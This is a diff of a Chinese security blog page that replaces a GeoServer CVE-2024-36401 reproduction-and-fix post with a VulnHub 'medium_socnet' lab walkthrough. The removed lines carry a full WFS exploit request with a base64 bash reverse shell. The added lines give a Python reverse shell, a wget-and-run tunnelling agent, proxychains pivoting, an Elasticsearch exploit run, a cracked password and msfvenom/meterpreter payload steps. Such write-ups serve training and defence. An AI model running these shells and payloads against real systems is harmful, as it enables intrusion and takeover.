@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>春秋云镜-GeoServer 前台代码执行漏洞（CVE-2024-36401） | isum</title>
-  <meta name="keywords" content=" 输入验证 , java ">
-  <meta name="description" content="春秋云镜-GeoServer 前台代码执行漏洞（CVE-2024-36401） | isum">
+  <title>vulnhub-medium_socnet | isum</title>
+  <meta name="keywords" content=" 内网穿透 ">
+  <meta name="description" content="vulnhub-medium_socnet | isum">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="一、信息收集与初始攻击​1、配置靶机网络环境 启动靶机时按住shift键，直至出现grub界面，然后按e键，进入编辑模式,找到ro, 并将ro修改为rw single init&#x3D;&#x2F;bin&#x2F;bash 按下Ctrl键+X键，此时进入单一用户模式 ip a 查看当前网卡信息 修改网卡文件，修改上面的网卡 vim &#x2F;etc&#x2F;network&#x2F;int">
 <meta property="og:type" content="article">
@@ -373,9 +373,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-春秋云镜-GeoServer-前台代码执行漏洞（CVE-2024-36401）" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-vulnhub-medium-socnet" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">春秋云镜-GeoServer 前台代码执行漏洞（CVE-2024-36401）</h1>
+        <h1 class="article-title">vulnhub-medium_socnet</h1>
     
     <div class="article-meta">
         
@@ -385,7 +385,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="漏洞复现">漏洞复现</a>
+            <a  data-rel="渗透靶机">渗透靶机</a>
             
         </span>
         
@@ -393,16 +393,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">输入验证</a>
-            
-            <a class="color5">java</a>
+            <a class="color5">内网穿透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2025-05-07 10:36:05'>2025-05-07 10:34</time>
+            发布时间 : <time class="date" title='最后更新: 2025-05-10 20:52:14'>2025-05-10 20:51</time>
         
     </div>
     <div class="article-meta">
@@ -435,7 +433,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0"><span class="toc-text">一、概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%88%86%E6%9E%90"><span class="toc-text">二、分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%A4%8D%E7%8E%B0"><span class="toc-text">三、复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BF%AE%E5%A4%8D"><span class="toc-text">四、修复</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%8B%E2%80%8B1-%E4%BF%AE%E5%A4%8D%E7%89%88%E6%9C%AC%E2%80%8B%E2%80%8B"><span class="toc-text">​​1. 修复版本​​</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%8B2-%E4%BF%AE%E5%A4%8D%E5%8E%9F%E7%90%86%E2%80%8B%E2%80%8B"><span class="toc-text">​2. 修复原理​​</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%80%BB%E7%BB%93"><span class="toc-text">3. 总结</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E5%88%9D%E5%A7%8B%E6%94%BB%E5%87%BB%E2%80%8B"><span class="toc-text">一、信息收集与初始攻击​</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E9%9D%B6%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83"><span class="toc-text">1、配置靶机网络环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">2、主机发现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%8C%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-text">3、端口扫描，服务探测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81web%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-text">4、web服务探测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Docker-%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E4%B8%8E%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E2%80%8B"><span class="toc-text">二、Docker 容器逃逸与内网穿透​</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81%E7%A1%AE%E8%AE%A4-Docker-%E7%8E%AF%E5%A2%83%E2%80%8B%E2%80%8B"><span class="toc-text">5、确认 Docker 环境​​</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81%E2%80%8B%E2%80%8B%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E2%80%8B"><span class="toc-text">6、​​内网主机发现​</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7%E3%80%81%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%90%AD%E5%BB%BA"><span class="toc-text">7、代理工具搭建</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E2%80%8B"><span class="toc-text">三、内网横向渗透​</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#8%E3%80%81%E5%86%85%E7%BD%91%E6%9C%BA%E5%99%A8%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-text">8、内网机器端口服务探测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9%E3%80%81%E2%80%8B%E2%80%8BElasticsearch-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E2%80%8B%E2%80%8B%EF%BC%9A"><span class="toc-text">9、​​Elasticsearch 漏洞利用​​：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10%E3%80%81%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B8%8E-SSH-%E7%99%BB%E5%BD%95%E2%80%8B%EF%BC%9A"><span class="toc-text">10、密码破解与 SSH 登录​：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%EF%BC%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-text">四、本地提权（内核漏洞）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E8%A1%A5%E5%85%85"><span class="toc-text">五、补充</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#msf%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">msf的使用</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -451,62 +449,128 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>CVE-2024-36401 是 ​<strong>​GeoServer​</strong>​ 中存在的高危远程代码执行（RCE）漏洞，由 ​<strong>​GeoTools 库​</strong>​ 在处理 WFS（Web Feature Service）请求时对 <code>valueReference</code> 参数未正确过滤引发。攻击者可通过构造恶意 XPath 表达式，利用 <code>java.lang.Runtime.getRuntime()</code> 执行任意系统命令，进而完全控制目标服务器</p>
-<ul>
-<li>​<strong>​影响版本​</strong>​：<ul>
-<li>GeoServer &lt; 2.23.6</li>
-<li>2.24.0 ≤ GeoServer &lt; 2.24.4</li>
-<li>2.25.0 ≤ GeoServer &lt; 2.25.2</li>
+        <h3 id="一、信息收集与初始攻击​"><a href="#一、信息收集与初始攻击​" class="headerlink" title="一、信息收集与初始攻击​"></a>一、信息收集与初始攻击​</h3><h5 id="1、配置靶机网络环境"><a href="#1、配置靶机网络环境" class="headerlink" title="1、配置靶机网络环境"></a>1、配置靶机网络环境</h5><ul>
+<li>启动靶机时按住shift键，直至出现grub界面，然后按e键，进入编辑模式,找到ro, 并将ro修改为rw single init&#x3D;&#x2F;bin&#x2F;bash<img src="/2025/05/10/vulnhub-medium-socnet/1.png" class=""></li>
+<li>按下Ctrl键+X键，此时进入单一用户模式</li>
+<li>ip a 查看当前网卡信息</li>
+<li>修改网卡文件，修改上面的网卡 vim &#x2F;etc&#x2F;network&#x2F;interfaces<img src="/2025/05/10/vulnhub-medium-socnet/2.png" class=""></li>
+<li>重启</li>
 </ul>
-</li>
-<li>​<strong>​漏洞根源​</strong>​：GeoTools 库将属性名称传递给 ​<strong>​Apache Commons JXPath​</strong>​ 库时未安全处理，导致 XPath 表达式注入</li>
+<h5 id="2、主机发现"><a href="#2、主机发现" class="headerlink" title="2、主机发现"></a>2、主机发现</h5><p>nmap -sn 10.10.8.0&#x2F;8（-sn比-sP尝试更多的协议）<br>发现10.10.8.21为新增加的IP，即为靶机IP<br>（攻击ip为10.10.8.11）</p>
+<h5 id="3、端口扫描，服务探测"><a href="#3、端口扫描，服务探测" class="headerlink" title="3、端口扫描，服务探测"></a>3、端口扫描，服务探测</h5><p>nmap -p- -sT -sV -A -O 10.10.8.21<br>-sT指定以tcp协议进行扫描，-sV探测服务版本，-O探测操作系统的版本<br>（端口扫描：nmap -p- 10.10.8.21  服务探测：nmap -p22,5000 -sT -sV -O 10.10.8.21）</p>
+<img src="/2025/05/10/vulnhub-medium-socnet/3.png" class="">
+<img src="/2025/05/10/vulnhub-medium-socnet/4.png" class="">
+<img src="/2025/05/10/vulnhub-medium-socnet/5.png" class="">
+<h5 id="4、web服务探测"><a href="#4、web服务探测" class="headerlink" title="4、web服务探测"></a>4、web服务探测</h5><ul>
+<li>访问 <a href="http://10.10.8.21:5000，发现输入框并尝试代码注入，无果">http://10.10.8.21:5000，发现输入框并尝试代码注入，无果</a></li>
+<li>目录爆破找到 &#x2F;admin 路径，可以执行python代码（<code>dirb http://10.10.8.21:5000</code>）</li>
+<li>反弹shell</li>
 </ul>
-<h3 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h3><p><strong>（1）技术原理​</strong>​</p>
-<ul>
-<li>​<strong>​触发路径​</strong>​：通过 WFS 请求的 <code>valueReference</code> 参数注入恶意代码。</li>
-<li>​<strong>​依赖组件​</strong>​：<code>commons-jxpath</code> 库（存在 CVE-2022-41852 漏洞）的不安全解析<br>​<strong>​（2）攻击特征​</strong>​</li>
-<li>​<strong>​请求方式​</strong>​：支持 GET 和 POST 请求，常见于 <code>/geoserver/wfs</code> 接口</li>
-<li>​<strong>​利用条件​</strong>​：<code>typeNames</code> 必须为有效图层名称（如 <code>sf:archsites</code>），可从 GeoServer 管理界面获取</li>
-</ul>
-<h3 id="三、复现"><a href="#三、复现" class="headerlink" title="三、复现"></a>三、复现</h3><p>(1)、攻击机监听<br>nc -lvvp 8889</p>
-<p>(2)、发送数据包</p>
-<pre><code class="http">POST /geoserver/wfs HTTP/1.1
-Host: &lt;target&gt;:8080
-Content-Type: application/xml
-Content-Length: 342
+<pre><code class="bash">nc -lvvp 8889
 
-&lt;wfs:GetPropertyValue service=&quot;WFS&quot; version=&quot;2.0.0&quot; xmlns:wfs=&quot;http://www.opengis.net/wfs/2.0&quot;&gt;
-  &lt;wfs:Query typeNames=&quot;sf:archsites&quot;/&gt;
-  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMy44MC4xNS84ODg5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&lt;/wfs:valueReference&gt;
-&lt;/wfs:GetPropertyValue&gt;
-
-bash -i &gt;&amp; /dev/tcp/47.13.80.15/8889 0&gt;&amp;1
+import os,pty,socket;s=socket.socket();s.connect((&quot;10.10.8.11&quot;,8889));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)
 </code></pre>
-<img src="/2025/05/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-GeoServer-%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-36401%EF%BC%89/1.png" class="">
-<h3 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h3><h5 id="​​1-修复版本​​"><a href="#​​1-修复版本​​" class="headerlink" title="​​1. 修复版本​​"></a>​​1. 修复版本​​</h5><p>GeoServer 官方通过升级 ​<strong>​GeoTools 库​</strong>​ 修复漏洞，安全版本如下：</p>
-<ul>
-<li>​<strong>​GeoServer 2.23.6​</strong>​（稳定分支）</li>
-<li>​<strong>​GeoServer 2.24.4​</strong>​（稳定分支）</li>
-<li>​<strong>​GeoServer 2.25.2​</strong>​（开发分支）</li>
-</ul>
-<h5 id="​2-修复原理​​"><a href="#​2-修复原理​​" class="headerlink" title="​2. 修复原理​​"></a>​2. 修复原理​​</h5><p>​<strong>​根本原因​</strong>​：<br>漏洞源于 GeoTools 库（<code>gt-complex</code> 模块）在处理 WFS 请求时，直接将用户控制的 <code>valueReference</code> 参数传递给 <code>commons-jxpath</code> 库解析，导致 XPath 表达式注入。</p>
-<p>​<strong>​修复方式​</strong>​：</p>
+<img src="/2025/05/10/vulnhub-medium-socnet/6.png" class="">
+
+<h3 id="二、Docker-容器逃逸与内网穿透​"><a href="#二、Docker-容器逃逸与内网穿透​" class="headerlink" title="二、Docker 容器逃逸与内网穿透​"></a>二、Docker 容器逃逸与内网穿透​</h3><h5 id="5、确认-Docker-环境​​"><a href="#5、确认-Docker-环境​​" class="headerlink" title="5、确认 Docker 环境​​"></a>5、确认 Docker 环境​​</h5><p>查看ip地址发现是172.17.0.3<br>检查根目录的 &#x2F;.dockerenv 文件或&#x2F;proc&#x2F;1&#x2F;cgroup内容，确认处于容器内</p>
+<h5 id="6、​​内网主机发现​"><a href="#6、​​内网主机发现​" class="headerlink" title="6、​​内网主机发现​"></a>6、​​内网主机发现​</h5><p>编写脚本扫描 Docker 网段：</p>
+<pre><code class="bash">for i in $(seq 1 10);do ping -c 1 172.17.0.$i;done
+//seq函数功能是输出连续数字，-c 命令指执行次数
+</code></pre>
+<p>存在：172.17.0.1，172.17.0.2，172.17.0.3</p>
+<img src="/2025/05/10/vulnhub-medium-socnet/7.png" class="">
+<h5 id="7、代理工具搭建"><a href="#7、代理工具搭建" class="headerlink" title="7、代理工具搭建"></a>7、代理工具搭建</h5><p>使用 ​<strong>​Venom​</strong>​ 建立隧道：</p>
 <ol>
-<li>​<strong>​安全过滤​</strong>​：<ul>
-<li>在 <code>org.geotools.filter.text.cql2.CQL.toExpression()</code> 方法中，新增对 <code>valueReference</code> 的输入验证，禁止包含 <code>java.lang</code> 等危险关键字。</li>
-<li>使用 <code>JXPathUtils.newSafeContext()</code> 替代原始解析方法，限制 XPath 表达式的反射能力。</li>
-</ul>
-</li>
-<li>​<strong>​依赖升级​</strong>​：<ul>
-<li>升级 <code>commons-jxpath</code> 到 ​<strong>​1.3+​</strong>​ 版本（修复 CVE-2022-41852），默认禁用反射调用。</li>
-</ul>
-</li>
-<li>​<strong>​补丁提交​</strong>​：<ul>
-<li>修复代码已合并至 GeoTools 主分支（GitHub Commit）。</li>
-</ul>
-</li>
+<li>Kali 启动服务端：</li>
 </ol>
-<h5 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h5><p>官方通过 ​<strong>​输入验证​</strong>​ + ​<strong>​依赖库升级​</strong>​ 双重修复漏洞，建议用户立即升级至安全版本。若无法升级，可通过删除依赖文件或配置 WAF 临时防护。</p>
+<pre><code class="bash">cd /Venom v1.1.0
+chmod 777 admin_linux_x64
+./admin_linux_x64 -lport 8889
+</code></pre>
+<ol start="2">
+<li>靶机下载客户端：</li>
+</ol>
+<pre><code class="bash">wget http://&lt;Kali_IP&gt;:8890/agent_linux_x64
+chmod 777 agent_linux_x64
+mv agent_linux_x64 ag
+./ag -rhost &lt;Kali_IP&gt; -rport 8889
+</code></pre>
+<p>成功连接</p>
+<img src="/2025/05/10/vulnhub-medium-socnet/8.png" class="">
+
+<ol start="3">
+<li>为攻击机配置 proxychains全局代理（socks5 127.0.0.1 8887）</li>
+</ol>
+<pre><code class="bash">//在本地开启一个socks侦听的代理
+goto 1
+(node 1) &gt;&gt;&gt; socks 8887
+
+//使用proxychains挂载代理
+sudo apt-get install proxychains4
+vim /etc/proxychains4.conf
+：socks5 127.0.0.1 8887
+proxychains ping 172.17.0.1 //成功ping通
+</code></pre>
+<h3 id="三、内网横向渗透​"><a href="#三、内网横向渗透​" class="headerlink" title="三、内网横向渗透​"></a>三、内网横向渗透​</h3><h5 id="8、内网机器端口服务探测"><a href="#8、内网机器端口服务探测" class="headerlink" title="8、内网机器端口服务探测"></a>8、内网机器端口服务探测</h5><p>172.17.0.1<br>端口：proxychains nmap -Pn -sT 172.17.0.1<br>服务：proxychains nmap -Pn -sT -sV 172.17.0.1<br>-Pn参数：当使用nmap扫描内网主机时，使用-Pn参数可以禁用主机的Ping扫描，这意味着即使主机没有响应ping请求，nmap仍然会尝试扫描该主机。这对于检测隐藏主机或防火墙阻止ping扫描的情况非常有用<br>经确认172.17.0.1为宿主机</p>
+<p>172.17.0.2<br>端口：proxychains nmap -Pn -sT 172.17.0.2<br>服务：proxychains nmap -Pn -sT -sV 172.17.0.2<br>在9200端口上运行了Elasticsearch服务</p>
+<h5 id="9、​​Elasticsearch-漏洞利用​​："><a href="#9、​​Elasticsearch-漏洞利用​​：" class="headerlink" title="9、​​Elasticsearch 漏洞利用​​："></a>9、​​Elasticsearch 漏洞利用​​：</h5><p>searchsploit elasticsearch<br>proxychains python 36337.py 172.17.0.2</p>
+<h5 id="10、密码破解与-SSH-登录​："><a href="#10、密码破解与-SSH-登录​：" class="headerlink" title="10、密码破解与 SSH 登录​："></a>10、密码破解与 SSH 登录​：</h5><p>在容器3内找到 &#x2F;passwords文件，解密 MD5 哈希（john:1337hack），通过 SSH 登录宿主机的普通用户<br>ssh <a href="mailto:&#x6a;&#111;&#x68;&#110;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#x36;&#46;&#x31;&#x33;&#56;">&#x6a;&#111;&#x68;&#110;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#x36;&#46;&#x31;&#x33;&#56;</a>   </p>
+<h3 id="四、本地提权（内核漏洞）"><a href="#四、本地提权（内核漏洞）" class="headerlink" title="四、本地提权（内核漏洞）"></a>四、本地提权（内核漏洞）</h3><p>后面再补充</p>
+<h3 id="五、补充"><a href="#五、补充" class="headerlink" title="五、补充"></a>五、补充</h3><h5 id="msf的使用"><a href="#msf的使用" class="headerlink" title="msf的使用"></a>msf的使用</h5><img src="/2025/05/10/vulnhub-medium-socnet/10.png" class="">
+
+<ul>
+<li>生成木马文件：</li>
+</ul>
+<pre><code class="bash">msfvenom -payloads
+msfvenom1 -l payloads | grep windows
+msfvenom -l encoders
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -1 5 LHOST=192.168.18.22 LPORT=4444 -f exe &gt;/root/muma.exe
+</code></pre>
+<ul>
+<li>监听：</li>
+</ul>
+<pre><code class="bash">use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+exploit-j/run 开启监听
+//查看监听到的会话，并将该会话以Meterpreter会话的形式显示
+</code></pre>
+<ul>
+<li><p>会话调优：<br>使用会话前set SessionCommunicationTimeout 0<br>（在使用会话前需要进行简单的调优。输入命令background，将当前的Meterpreter会话放置到后台，然后输入命令set SessionCommunicationTimeout 0。如果一个会话在5分钟之内没有做任何事情，将会被杀死，而将SessionCommunicationTimeout的值修改为0可以避免这种情况。还需要注意的是，Meterpreter会话会在一周后会被强制关闭，可以输入命令set SessionExpirationTimeout 0，修改为永不关闭。）</p>
+</li>
+<li><p>会话命令：<br>sysinfo，ipconfig，getuid，getsystem，use -l 使用扩展插件</p>
+</li>
+<li><p>nc shell转交至msf中：</p>
+</li>
+</ul>
+<pre><code class="bash">use exploit/multi/handler
+set payload/cmd/unix/reverse_lua
+show options
+set lhost 0.0.0.0
+set lport 8890
+exploit
+
+nc 10.10.8.11 8890 -e sh
+sessions -u 4 （Upgrade Command Shell to Meterpreter）
+</code></pre>
+<ul>
+<li>msf进行端口扫描</li>
+</ul>
+<pre><code class="bash">run autoroute -s 172.17.0.0/24 //加指向路由
+run autoroute -p //查看当前添加的路由
+use auxiliary/scanner/portscan/tcp 
+set rhosts 172.17.0.1-172.17.0.254 
+set ports 1-10000 
+run
+</code></pre>
+<ul>
+<li>为了方便后续渗透，建立一条SOCKS_5的代理</li>
+</ul>
+<pre><code class="bash">search socks_proxy 
+use auxiliary/server/socks_proxy
+run
+jobs
+</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 梦里小镇落雨，开花，起风，挂霜，甚至扬起烤红薯的香气，每个墙角都能听见人们的说笑声。 </span>
